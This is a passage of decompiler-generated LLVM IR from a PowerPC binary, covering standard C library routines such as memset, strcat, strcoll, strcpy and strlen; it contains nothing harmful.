  store i32 %v1_1000b344, i32* %ctr.global-to-local, align 4
  %v2_1000b344 = icmp eq i32 %v1_1000b344, 0
  br i1 %v2_1000b344, label %dec_label_pc_1000b348, label %dec_label_pc_1000b334

dec_label_pc_1000b348:                            ; preds = %dec_label_pc_1000b334, %dec_label_pc_1000b3a4, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_1000b38c, %dec_label_pc_1000b3a4 ], [ %.0, %dec_label_pc_1000b334 ]
  %v1_1000b348 = urem i32 %.1, 8
  store i32 %v1_1000b348, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000b348, 4
  br i1 %tmp, label %dec_label_pc_1000b360, label %dec_label_pc_1000b354

dec_label_pc_1000b354:                            ; preds = %dec_label_pc_1000b348
  %v0_1000b354 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000b354 = add i32 %v0_1000b354, 4
  %v2_1000b354 = inttoptr i32 %v1_1000b354 to i32*
  %v3_1000b354 = load i32, i32* %v2_1000b354, align 4
  store i32 %v1_1000b354, i32* %r4.global-to-local, align 4
  %v1_1000b358 = add nsw i32 %v1_1000b348, -4
  store i32 %v1_1000b358, i32* @r5, align 4
  %v1_1000b35c = load i32, i32* @r11, align 4
  %v2_1000b35c = add i32 %v1_1000b35c, 4
  %v3_1000b35c = inttoptr i32 %v2_1000b35c to i32*
  store i32 %v3_1000b354, i32* %v3_1000b35c, align 4
  store i32 %v2_1000b35c, i32* @r11, align 4
  %v0_1000b360.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000b360

dec_label_pc_1000b360:                            ; preds = %dec_label_pc_1000b348, %dec_label_pc_1000b354
  %v0_1000b360 = phi i32 [ %v1_1000b348, %dec_label_pc_1000b348 ], [ %v0_1000b360.pre, %dec_label_pc_1000b354 ]
  %v3_1000b360 = icmp eq i32 %v0_1000b360, 0
  %v0_1000b364 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000b360, i32 %v0_1000b364)
  %v0_1000b368 = load i32, i32* @r5, align 4
  store i32 %v0_1000b368, i32* %ctr.global-to-local, align 4
  %v0_1000b36c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000b36c = add i32 %v0_1000b36c, 3
  store i32 %v1_1000b36c, i32* %r4.global-to-local, align 4
  %v0_1000b370 = load i32, i32* @r11, align 4
  %v1_1000b370 = add i32 %v0_1000b370, 3
  store i32 %v1_1000b370, i32* %r9.global-to-local, align 4
  %v1_1000b3749 = add i32 %v0_1000b36c, 4
  %v2_1000b37410 = inttoptr i32 %v1_1000b3749 to i8*
  %v3_1000b37411 = load i8, i8* %v2_1000b37410, align 1
  store i32 %v1_1000b3749, i32* %r4.global-to-local, align 4
  %v3_1000b37813 = add i32 %v0_1000b370, 4
  %v4_1000b37814 = inttoptr i32 %v3_1000b37813 to i8*
  store i8 %v3_1000b37411, i8* %v4_1000b37814, align 1
  store i32 %v3_1000b37813, i32* %r9.global-to-local, align 4
  %v0_1000b37c15 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b37c16 = add i32 %v0_1000b37c15, -1
  store i32 %v1_1000b37c16, i32* %ctr.global-to-local, align 4
  %v2_1000b37c17 = icmp eq i32 %v1_1000b37c16, 0
  br i1 %v2_1000b37c17, label %dec_label_pc_1000b3b0, label %dec_label_pc_1000b374.dec_label_pc_1000b374_crit_edge

dec_label_pc_1000b374.dec_label_pc_1000b374_crit_edge: ; preds = %dec_label_pc_1000b360, %dec_label_pc_1000b374.dec_label_pc_1000b374_crit_edge
  %v3_1000b37818 = phi i32 [ %v3_1000b378, %dec_label_pc_1000b374.dec_label_pc_1000b374_crit_edge ], [ %v3_1000b37813, %dec_label_pc_1000b360 ]
  %v0_1000b374.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000b374 = add i32 %v0_1000b374.pre, 1
  %v2_1000b374 = inttoptr i32 %v1_1000b374 to i8*
  %v3_1000b374 = load i8, i8* %v2_1000b374, align 1
  store i32 %v1_1000b374, i32* %r4.global-to-local, align 4
  %v3_1000b378 = add i32 %v3_1000b37818, 1
  %v4_1000b378 = inttoptr i32 %v3_1000b378 to i8*
  store i8 %v3_1000b374, i8* %v4_1000b378, align 1
  store i32 %v3_1000b378, i32* %r9.global-to-local, align 4
  %v0_1000b37c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b37c = add i32 %v0_1000b37c, -1
  store i32 %v1_1000b37c, i32* %ctr.global-to-local, align 4
  %v2_1000b37c = icmp eq i32 %v1_1000b37c, 0
  br i1 %v2_1000b37c, label %dec_label_pc_1000b3b0, label %dec_label_pc_1000b374.dec_label_pc_1000b374_crit_edge

dec_label_pc_1000b384:                            ; preds = %dec_label_pc_1000b328
  %v1_1000b384 = sub nsw i32 4, %v1_1000b328
  store i32 %v1_1000b384, i32* %ctr.global-to-local, align 4
  %v1_1000b38c = load i32, i32* @r5, align 4
  %v2_1000b38c = sub i32 %v1_1000b38c, %v1_1000b384
  br label %dec_label_pc_1000b390

dec_label_pc_1000b390:                            ; preds = %dec_label_pc_1000b390.dec_label_pc_1000b390_crit_edge, %dec_label_pc_1000b384
  %v2_1000b398 = phi i32 [ %v1_1000b39c, %dec_label_pc_1000b390.dec_label_pc_1000b390_crit_edge ], [ %v1_1000b320, %dec_label_pc_1000b384 ]
  %v0_1000b390 = phi i32 [ %v0_1000b390.pre, %dec_label_pc_1000b390.dec_label_pc_1000b390_crit_edge ], [ %v1_1000b31c, %dec_label_pc_1000b384 ]
  %v1_1000b390 = add i32 %v0_1000b390, 4
  %v2_1000b390 = inttoptr i32 %v1_1000b390 to i8*
  %v3_1000b390 = load i8, i8* %v2_1000b390, align 1
  %v1_1000b394 = add i32 %v0_1000b390, 1
  store i32 %v1_1000b394, i32* %r4.global-to-local, align 4
  %v3_1000b398 = add i32 %v2_1000b398, 4
  %v4_1000b398 = inttoptr i32 %v3_1000b398 to i8*
  store i8 %v3_1000b390, i8* %v4_1000b398, align 1
  %v0_1000b39c = load i32, i32* @r11, align 4
  %v1_1000b39c = add i32 %v0_1000b39c, 1
  store i32 %v1_1000b39c, i32* @r11, align 4
  %v0_1000b3a0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b3a0 = add i32 %v0_1000b3a0, -1
  store i32 %v1_1000b3a0, i32* %ctr.global-to-local, align 4
  %v2_1000b3a0 = icmp eq i32 %v1_1000b3a0, 0
  br i1 %v2_1000b3a0, label %dec_label_pc_1000b3a4, label %dec_label_pc_1000b390.dec_label_pc_1000b390_crit_edge

dec_label_pc_1000b390.dec_label_pc_1000b390_crit_edge: ; preds = %dec_label_pc_1000b390
  %v0_1000b390.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000b390

dec_label_pc_1000b3a4:                            ; preds = %dec_label_pc_1000b390
  %v1_1000b3a4 = call i32 @__asm_rlwinm.(i32 %v2_1000b38c, i32 29, i32 3, i32 31)
  store i32 %v1_1000b3a4, i32* %r9.global-to-local, align 4
  %v4_1000b3a4 = icmp eq i32 %v1_1000b3a4, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1000b3a4, label %dec_label_pc_1000b348, label %dec_label_pc_1000b3a4.dec_label_pc_1000b330_crit_edge

dec_label_pc_1000b3a4.dec_label_pc_1000b330_crit_edge: ; preds = %dec_label_pc_1000b3a4
  %v1_1000b33c.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1000b330

dec_label_pc_1000b3b0:                            ; preds = %dec_label_pc_1000b374.dec_label_pc_1000b374_crit_edge, %dec_label_pc_1000b360
  %v0_1000b3b0 = load i32, i32* @r3, align 4
  ret i32 %v0_1000b3b0

; uselistorder directives
  uselistorder i32 %v1_1000b3a4, { 1, 2, 0 }
  uselistorder i32 %v1_1000b3a0, { 1, 0 }
  uselistorder i32 %v1_1000b39c, { 1, 0 }
  uselistorder i32 %v0_1000b390, { 1, 0 }
  uselistorder i32 %v2_1000b38c, { 2, 1, 0 }
  uselistorder i32 %v1_1000b37c, { 1, 0 }
  uselistorder i32 %v3_1000b378, { 1, 2, 0 }
  uselistorder i32 %v1_1000b348, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000b344, { 1, 0 }
  uselistorder i32 %v2_1000b340, { 1, 2, 0 }
  uselistorder i32 %v1_1000b328, { 1, 0 }
  uselistorder i32 %v1_1000b320, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 8, 6, 10, 7, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_1000b374.dec_label_pc_1000b374_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000b360, { 1, 0 }
  uselistorder label %dec_label_pc_1000b348, { 1, 0, 2 }
}

define i32 @__GI_memset(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000b3b4 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_1000b3b4, i32* %r9.global-to-local, align 4
  %v4_1000b3b4 = icmp eq i32 %v1_1000b3b4, 0
  store i1 %v4_1000b3b4, i1* %cr0_eq.global-to-local, align 1
  %v1_1000b3bc = add i32 %arg1, -4
  store i32 %v1_1000b3bc, i32* %r11.global-to-local, align 4
  %v1_1000b3c0 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_1000b3c4 = call i32 @__asm_rlwimi(i32 %v1_1000b3c0, i32 16, i32 0, i32 15)
  %v2_1000b3c4 = trunc i32 %v1_1000b3c4 to i8
  store i32 %v1_1000b3c4, i32* @r10, align 4
  %v0_1000b3c8 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000b3c8, label %dec_label_pc_1000b3ec, label %dec_label_pc_1000b3cc

dec_label_pc_1000b3cc:                            ; preds = %entry
  %v0_1000b3cc = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b3cc = urem i32 %v0_1000b3cc, 4
  %v3_1000b3cc = icmp eq i32 %v1_1000b3cc, 0
  store i1 %v3_1000b3cc, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000b3cc, label %dec_label_pc_1000b3cc.dec_label_pc_1000b3d4_crit_edge, label %dec_label_pc_1000b41c

dec_label_pc_1000b3cc.dec_label_pc_1000b3d4_crit_edge: ; preds = %dec_label_pc_1000b3cc
  %v0_1000b3d4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000b3d4

dec_label_pc_1000b3d4:                            ; preds = %dec_label_pc_1000b434.dec_label_pc_1000b3d4_crit_edge, %dec_label_pc_1000b3cc.dec_label_pc_1000b3d4_crit_edge
  %v0_1000b3d8.pre = phi i32 [ %v0_1000b3cc, %dec_label_pc_1000b3cc.dec_label_pc_1000b3d4_crit_edge ], [ %v0_1000b3d8.pre.pre, %dec_label_pc_1000b434.dec_label_pc_1000b3d4_crit_edge ]
  %v0_1000b3d4 = phi i32 [ %v0_1000b3d4.pre, %dec_label_pc_1000b3cc.dec_label_pc_1000b3d4_crit_edge ], [ %v1_1000b434, %dec_label_pc_1000b434.dec_label_pc_1000b3d4_crit_edge ]
  store i32 %v0_1000b3d4, i32* %ctr.global-to-local, align 4
  %v1_1000b3dc = sext i8 %v2_1000b3c4 to i32
  br label %dec_label_pc_1000b3d8

dec_label_pc_1000b3d8:                            ; preds = %dec_label_pc_1000b3d8, %dec_label_pc_1000b3d4
  %v0_1000b3d8 = phi i32 [ %v1_1000b3e4, %dec_label_pc_1000b3d8 ], [ %v0_1000b3d8.pre, %dec_label_pc_1000b3d4 ]
  %v1_1000b3d8 = add i32 %v0_1000b3d8, 4
  store i32 %v1_1000b3d8, i32* %r9.global-to-local, align 4
  %v4_1000b3dc = inttoptr i32 %v1_1000b3d8 to i32*
  store i32 %v1_1000b3dc, i32* %v4_1000b3dc, align 4
  %v2_1000b3e0 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000b3e0 = add i32 %v2_1000b3e0, 4
  %v4_1000b3e0 = inttoptr i32 %v3_1000b3e0 to i32*
  store i32 %v1_1000b3dc, i32* %v4_1000b3e0, align 4
  %v0_1000b3e4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b3e4 = add i32 %v0_1000b3e4, 4
  store i32 %v1_1000b3e4, i32* %r11.global-to-local, align 4
  %v0_1000b3e8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b3e8 = add i32 %v0_1000b3e8, -1
  store i32 %v1_1000b3e8, i32* %ctr.global-to-local, align 4
  %v2_1000b3e8 = icmp eq i32 %v1_1000b3e8, 0
  br i1 %v2_1000b3e8, label %dec_label_pc_1000b3ec, label %dec_label_pc_1000b3d8

dec_label_pc_1000b3ec:                            ; preds = %dec_label_pc_1000b3d8, %dec_label_pc_1000b434, %entry
  %v0_1000b3ec = load i32, i32* %r5.global-to-local, align 4
  %v1_1000b3ec = urem i32 %v0_1000b3ec, 8
  store i32 %v1_1000b3ec, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000b3ec, 4
  br i1 %tmp, label %dec_label_pc_1000b400, label %dec_label_pc_1000b3f8

dec_label_pc_1000b3f8:                            ; preds = %dec_label_pc_1000b3ec
  %v1_1000b3f8 = sext i8 %v2_1000b3c4 to i32
  %v2_1000b3f8 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000b3f8 = add i32 %v2_1000b3f8, 4
  %v4_1000b3f8 = inttoptr i32 %v3_1000b3f8 to i32*
  store i32 %v1_1000b3f8, i32* %v4_1000b3f8, align 4
  store i32 %v3_1000b3f8, i32* %r11.global-to-local, align 4
  %v0_1000b3fc = load i32, i32* @r5, align 4
  %v1_1000b3fc = add i32 %v0_1000b3fc, -4
  store i32 %v1_1000b3fc, i32* @r5, align 4
  br label %dec_label_pc_1000b400

dec_label_pc_1000b400:                            ; preds = %dec_label_pc_1000b3ec, %dec_label_pc_1000b3f8
  %v0_1000b400 = phi i32 [ %v1_1000b3ec, %dec_label_pc_1000b3ec ], [ %v1_1000b3fc, %dec_label_pc_1000b3f8 ]
  %v3_1000b400 = icmp eq i32 %v0_1000b400, 0
  %v0_1000b404 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000b400, i32 %v0_1000b404)
  %v0_1000b408 = load i32, i32* @r5, align 4
  store i32 %v0_1000b408, i32* %ctr.global-to-local, align 4
  %v0_1000b40c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b40c = add i32 %v0_1000b40c, 3
  store i32 %v1_1000b40c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000b410

dec_label_pc_1000b410:                            ; preds = %dec_label_pc_1000b410, %dec_label_pc_1000b400
  %v3_1000b410 = phi i32 [ %v4_1000b410, %dec_label_pc_1000b410 ], [ %v1_1000b40c, %dec_label_pc_1000b400 ]
  %v4_1000b410 = add i32 %v3_1000b410, 1
  %v5_1000b410 = inttoptr i32 %v4_1000b410 to i8*
  store i8 %v2_1000b3c4, i8* %v5_1000b410, align 1
  store i32 %v4_1000b410, i32* %r9.global-to-local, align 4
  %v0_1000b414 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b414 = add i32 %v0_1000b414, -1
  store i32 %v1_1000b414, i32* %ctr.global-to-local, align 4
  %v2_1000b414 = icmp eq i32 %v1_1000b414, 0
  br i1 %v2_1000b414, label %dec_label_pc_1000b440, label %dec_label_pc_1000b410

dec_label_pc_1000b41c:                            ; preds = %dec_label_pc_1000b3cc
  %v1_1000b41c = sub nsw i32 4, %v1_1000b3cc
  store i32 %v1_1000b41c, i32* %ctr.global-to-local, align 4
  %v1_1000b424 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000b424 = sub i32 %v1_1000b424, %v1_1000b41c
  store i32 %v2_1000b424, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000b428

dec_label_pc_1000b428:                            ; preds = %dec_label_pc_1000b428, %dec_label_pc_1000b41c
  %v3_1000b428 = phi i32 [ %v1_1000b42c, %dec_label_pc_1000b428 ], [ %v0_1000b3cc, %dec_label_pc_1000b41c ]
  %v4_1000b428 = add i32 %v3_1000b428, 4
  %v5_1000b428 = inttoptr i32 %v4_1000b428 to i8*
  store i8 %v2_1000b3c4, i8* %v5_1000b428, align 1
  %v0_1000b42c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b42c = add i32 %v0_1000b42c, 1
  store i32 %v1_1000b42c, i32* %r11.global-to-local, align 4
  %v0_1000b430 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b430 = add i32 %v0_1000b430, -1
  store i32 %v1_1000b430, i32* %ctr.global-to-local, align 4
  %v2_1000b430 = icmp eq i32 %v1_1000b430, 0
  br i1 %v2_1000b430, label %dec_label_pc_1000b434, label %dec_label_pc_1000b428

dec_label_pc_1000b434:                            ; preds = %dec_label_pc_1000b428
  %v0_1000b434 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000b434 = call i32 @__asm_rlwinm.(i32 %v0_1000b434, i32 29, i32 3, i32 31)
  store i32 %v1_1000b434, i32* %r9.global-to-local, align 4
  %v4_1000b434 = icmp eq i32 %v1_1000b434, 0
  store i1 %v4_1000b434, i1* %cr0_eq.global-to-local, align 1
  br i1 %v4_1000b434, label %dec_label_pc_1000b3ec, label %dec_label_pc_1000b434.dec_label_pc_1000b3d4_crit_edge

dec_label_pc_1000b434.dec_label_pc_1000b3d4_crit_edge: ; preds = %dec_label_pc_1000b434
  %v0_1000b3d8.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000b3d4

dec_label_pc_1000b440:                            ; preds = %dec_label_pc_1000b410
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000b434, { 1, 2, 0 }
  uselistorder i32 %v1_1000b430, { 1, 0 }
  uselistorder i32 %v1_1000b42c, { 1, 0 }
  uselistorder i32 %v1_1000b414, { 1, 0 }
  uselistorder i32 %v4_1000b410, { 1, 2, 0 }
  uselistorder i32 %v1_1000b3ec, { 2, 1, 0 }
  uselistorder i32 %v1_1000b3e8, { 1, 0 }
  uselistorder i32 %v1_1000b3e4, { 1, 0 }
  uselistorder i32 %v1_1000b3cc, { 1, 0 }
  uselistorder i32 %v0_1000b3cc, { 2, 1, 0 }
  uselistorder i8 %v2_1000b3c4, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1000b3c4, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder label %dec_label_pc_1000b400, { 1, 0 }
  uselistorder label %dec_label_pc_1000b3ec, { 1, 0, 2 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_1000b448

dec_label_pc_1000b448:                            ; preds = %dec_label_pc_1000b448, %entry
  %v0_1000b448 = phi i32 [ %v1_1000b44c, %dec_label_pc_1000b448 ], [ %tmp, %entry ]
  %v1_1000b448 = inttoptr i32 %v0_1000b448 to i8*
  %v2_1000b448 = load i8, i8* %v1_1000b448, align 1
  %v1_1000b44c = add i32 %v0_1000b448, 1
  %v3_1000b450 = icmp eq i8 %v2_1000b448, 0
  store i1 %v3_1000b450, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000b450, label %dec_label_pc_1000b458, label %dec_label_pc_1000b448

dec_label_pc_1000b458:                            ; preds = %dec_label_pc_1000b448
  %v1_1000b458 = add i32 %v0_1000b448, -1
  br label %dec_label_pc_1000b45c

dec_label_pc_1000b45c:                            ; preds = %dec_label_pc_1000b45c, %dec_label_pc_1000b458
  %v2_1000b468 = phi i32 [ %v3_1000b468, %dec_label_pc_1000b45c ], [ %v1_1000b458, %dec_label_pc_1000b458 ]
  %v0_1000b45c = load i32, i32* @r4, align 4
  %v1_1000b45c = inttoptr i32 %v0_1000b45c to i8*
  %v2_1000b45c = load i8, i8* %v1_1000b45c, align 1
  %v1_1000b460 = add i32 %v0_1000b45c, 1
  store i32 %v1_1000b460, i32* @r4, align 4
  %v3_1000b464 = icmp eq i8 %v2_1000b45c, 0
  store i1 %v3_1000b464, i1* %cr7_eq.global-to-local, align 1
  %v3_1000b468 = add i32 %v2_1000b468, 1
  %v4_1000b468 = inttoptr i32 %v3_1000b468 to i8*
  store i8 %v2_1000b45c, i8* %v4_1000b468, align 1
  %v0_1000b46c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000b46c, label %dec_label_pc_1000b470, label %dec_label_pc_1000b45c

dec_label_pc_1000b470:                            ; preds = %dec_label_pc_1000b45c
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v3_1000b468, { 1, 0 }
  uselistorder i32 %v0_1000b448, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000b480.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000b478

dec_label_pc_1000b478:                            ; preds = %dec_label_pc_1000b49c, %entry
  %v0_1000b480 = phi i32 [ %v1_1000b484, %dec_label_pc_1000b49c ], [ %v0_1000b480.pre, %entry ]
  %v0_1000b478 = phi i32 [ %v1_1000b47c, %dec_label_pc_1000b49c ], [ %tmp, %entry ]
  %v1_1000b478 = inttoptr i32 %v0_1000b478 to i8*
  %v2_1000b478 = load i8, i8* %v1_1000b478, align 1
  %v3_1000b478 = zext i8 %v2_1000b478 to i32
  %v1_1000b480 = inttoptr i32 %v0_1000b480 to i8*
  %v2_1000b480 = load i8, i8* %v1_1000b480, align 1
  %v3_1000b480 = zext i8 %v2_1000b480 to i32
  %v3_1000b488 = icmp eq i8 %v2_1000b478, 0
  br i1 %v3_1000b488, label %dec_label_pc_1000b494, label %dec_label_pc_1000b49c

dec_label_pc_1000b494:                            ; preds = %dec_label_pc_1000b478
  %v1_1000b494 = sub nsw i32 0, %v3_1000b480
  ret i32 %v1_1000b494

dec_label_pc_1000b49c:                            ; preds = %dec_label_pc_1000b478
  %v4_1000b48c = icmp eq i8 %v2_1000b478, %v2_1000b480
  %v1_1000b484 = add i32 %v0_1000b480, 1
  %v1_1000b47c = add i32 %v0_1000b478, 1
  br i1 %v4_1000b48c, label %dec_label_pc_1000b478, label %dec_label_pc_1000b4a0

dec_label_pc_1000b4a0:                            ; preds = %dec_label_pc_1000b49c
  %v2_1000b4a0 = sub nsw i32 %v3_1000b478, %v3_1000b480
  ret i32 %v2_1000b4a0

; uselistorder directives
  uselistorder i32 %v3_1000b480, { 1, 0 }
  uselistorder i32 %v0_1000b478, { 1, 0 }
  uselistorder i32 %v0_1000b480, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_1000b4a8 = add i32 %arg1, -1
  %v1_1000b4ac = sub i32 %v2_1000b4a8, %tmp
  store i32 %v1_1000b4ac, i32* %r9.global-to-local, align 4
  %v2_1000b4b04 = load i8, i8* %arg2, align 1
  %v1_1000b4b46 = add i32 %tmp, 1
  store i32 %v1_1000b4b46, i32* %r4.global-to-local, align 4
  %v3_1000b4b88 = icmp eq i8 %v2_1000b4b04, 0
  store i1 %v3_1000b4b88, i1* %cr7_eq.global-to-local, align 1
  %v5_1000b4bc9 = inttoptr i32 %arg1 to i8*
  store i8 %v2_1000b4b04, i8* %v5_1000b4bc9, align 1
  %v0_1000b4c010 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000b4c010, label %dec_label_pc_1000b4c4, label %dec_label_pc_1000b4b0.dec_label_pc_1000b4b0_crit_edge

dec_label_pc_1000b4b0.dec_label_pc_1000b4b0_crit_edge: ; preds = %entry, %dec_label_pc_1000b4b0.dec_label_pc_1000b4b0_crit_edge
  %v0_1000b4b0.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_1000b4bc.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b4b0 = inttoptr i32 %v0_1000b4b0.pre to i8*
  %v2_1000b4b0 = load i8, i8* %v1_1000b4b0, align 1
  %v1_1000b4b4 = add i32 %v0_1000b4b0.pre, 1
  store i32 %v1_1000b4b4, i32* %r4.global-to-local, align 4
  %v3_1000b4b8 = icmp eq i8 %v2_1000b4b0, 0
  store i1 %v3_1000b4b8, i1* %cr7_eq.global-to-local, align 1
  %v4_1000b4bc = add i32 %v1_1000b4b4, %v2_1000b4bc.pre
  %v5_1000b4bc = inttoptr i32 %v4_1000b4bc to i8*
  store i8 %v2_1000b4b0, i8* %v5_1000b4bc, align 1
  %v0_1000b4c0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000b4c0, label %dec_label_pc_1000b4c4, label %dec_label_pc_1000b4b0.dec_label_pc_1000b4b0_crit_edge

dec_label_pc_1000b4c4:                            ; preds = %dec_label_pc_1000b4b0.dec_label_pc_1000b4b0_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b4b0.dec_label_pc_1000b4b0_crit_edge, { 1, 0 }
}

define i32 @__GI_strlen() local_unnamed_addr {
entry:
  %v0_1000b4c8 = load i32, i32* @r3, align 4
  store i32 %v0_1000b4c8, i32* @r10, align 4
  %v1_1000b4e03 = urem i32 %v0_1000b4c8, 4
  %v3_1000b4e05 = icmp eq i32 %v1_1000b4e03, 0
  br i1 %v3_1000b4e05, label %dec_label_pc_1000b4e8, label %dec_label_pc_1000b4d0

dec_label_pc_1000b4d0:                            ; preds = %entry, %dec_label_pc_1000b4dc
  %v0_1000b4dc = phi i32 [ %v1_1000b4dc, %dec_label_pc_1000b4dc ], [ %v0_1000b4c8, %entry ]
  %v1_1000b4d0 = inttoptr i32 %v0_1000b4dc to i8*
  %v2_1000b4d0 = load i8, i8* %v1_1000b4d0, align 1
  %v3_1000b4d4 = icmp eq i8 %v2_1000b4d0, 0
  br i1 %v3_1000b4d4, label %dec_label_pc_1000b51c, label %dec_label_pc_1000b4dc

dec_label_pc_1000b4dc:                            ; preds = %dec_label_pc_1000b4d0
  %v1_1000b4dc = add i32 %v0_1000b4dc, 1
  %v1_1000b4e0 = urem i32 %v1_1000b4dc, 4
  %v3_1000b4e0 = icmp eq i32 %v1_1000b4e0, 0
  br i1 %v3_1000b4e0, label %dec_label_pc_1000b4e8, label %dec_label_pc_1000b4d0

dec_label_pc_1000b4e8:                            ; preds = %dec_label_pc_1000b4dc, %entry
  %v0_1000b4ec = phi i32 [ %v0_1000b4c8, %entry ], [ %v1_1000b4dc, %dec_label_pc_1000b4dc ]
  store i32 -2139062144, i32* @r8, align 4
  br label %dec_label_pc_1000b4f4

dec_label_pc_1000b4f4:                            ; preds = %dec_label_pc_1000b554, %dec_label_pc_1000b4f4, %dec_label_pc_1000b4e8
  %v1_1000b530 = phi i32 [ %v0_1000b4ec, %dec_label_pc_1000b4e8 ], [ %v1_1000b4f8, %dec_label_pc_1000b4f4 ], [ %v1_1000b4f8, %dec_label_pc_1000b554 ]
  %v1_1000b4f4 = inttoptr i32 %v1_1000b530 to i32*
  %v2_1000b4f4 = load i32, i32* %v1_1000b4f4, align 4
  %v1_1000b4f8 = add i32 %v1_1000b530, 4
  %v1_1000b504 = add i32 %v2_1000b4f4, -16843009
  %v2_1000b508 = and i32 %v1_1000b504, -2139062144
  %v5_1000b508 = icmp eq i32 %v2_1000b508, 0
  br i1 %v5_1000b508, label %dec_label_pc_1000b4f4, label %dec_label_pc_1000b510

dec_label_pc_1000b510:                            ; preds = %dec_label_pc_1000b4f4
  %v2_1000b510 = inttoptr i32 %v1_1000b530 to i8*
  %v3_1000b510 = load i8, i8* %v2_1000b510, align 1
  %v3_1000b514 = icmp eq i8 %v3_1000b510, 0
  br i1 %v3_1000b514, label %dec_label_pc_1000b51c, label %dec_label_pc_1000b524

dec_label_pc_1000b51c:                            ; preds = %dec_label_pc_1000b4d0, %dec_label_pc_1000b510
  %v1_1000b51c = phi i32 [ %v1_1000b530, %dec_label_pc_1000b510 ], [ %v0_1000b4dc, %dec_label_pc_1000b4d0 ]
  %v2_1000b51c = sub i32 %v1_1000b51c, %v0_1000b4c8
  ret i32 %v2_1000b51c

dec_label_pc_1000b524:                            ; preds = %dec_label_pc_1000b510
  %v1_1000b524 = add i32 %v1_1000b530, 1
  %v2_1000b524 = inttoptr i32 %v1_1000b524 to i8*
  %v3_1000b524 = load i8, i8* %v2_1000b524, align 1
  %v3_1000b528 = icmp eq i8 %v3_1000b524, 0
  br i1 %v3_1000b528, label %dec_label_pc_1000b530, label %dec_label_pc_1000b53c

dec_label_pc_1000b530:                            ; preds = %dec_label_pc_1000b524
  %v2_1000b530 = sub i32 %v1_1000b530, %v0_1000b4c8
